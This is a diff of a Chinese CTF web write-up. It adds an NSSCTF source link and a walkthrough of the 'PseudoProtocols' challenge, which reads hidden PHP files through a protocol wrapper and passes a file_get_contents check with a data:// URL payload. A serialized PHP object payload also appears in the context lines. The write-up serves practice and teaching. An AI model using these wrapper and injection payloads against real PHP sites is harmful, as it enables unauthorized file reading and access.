@@ -1,5 +1,7 @@
  # CTF-WEB
 
+> 题目来源[题库 | NSSCTF](https://www.nssctf.cn/problem)
+
 ## 1. PHP md5 相等绕过
 要求字符串不同，但MD5相同
 
@@ -724,3 +726,48 @@ O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 然后查看log信息，对比两次提交即可
 
 ![image-20240901095711570](./img/1-CTF_WEB/image-20240901095711570.png)
+
+## 8. [SWPUCTF 2021 新生赛]PseudoProtocols
+
+初始提示`http://node7.anna.nssctf.cn:22900/index.php?wllm=`
+
+![image-20240925104555403](img/1-CTF_WEB/image-20240925104555403.png)
+
+先用php协议读一下hint.php
+
+![image-20240925104715121](img/1-CTF_WEB/image-20240925104715121.png)
+
+然后解码这个hint.php
+
+```php
+<?php
+//go to /test2222222222222.php
+?>
+```
+
+还是一样，读test2222222222222.php
+
+![image-20240925104906653](img/1-CTF_WEB/image-20240925104906653.png)
+
+解码后
+
+```
+<?php
+ini_set("max_execution_time", "180");
+show_source(__FILE__);
+include('flag.php');
+$a= $_GET["a"];
+if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
+	echo "success\n";
+	echo $flag;
+}
+?>
+```
+
+发现`file_get_contents`函数，读取后的内容等于`I want flag`
+
+```
+GET /test2222222222222.php?a=data://text/plain,I%20want%20flag 
+```
+
+![image-20240925105137206](img/1-CTF_WEB/image-20240925105137206.png)
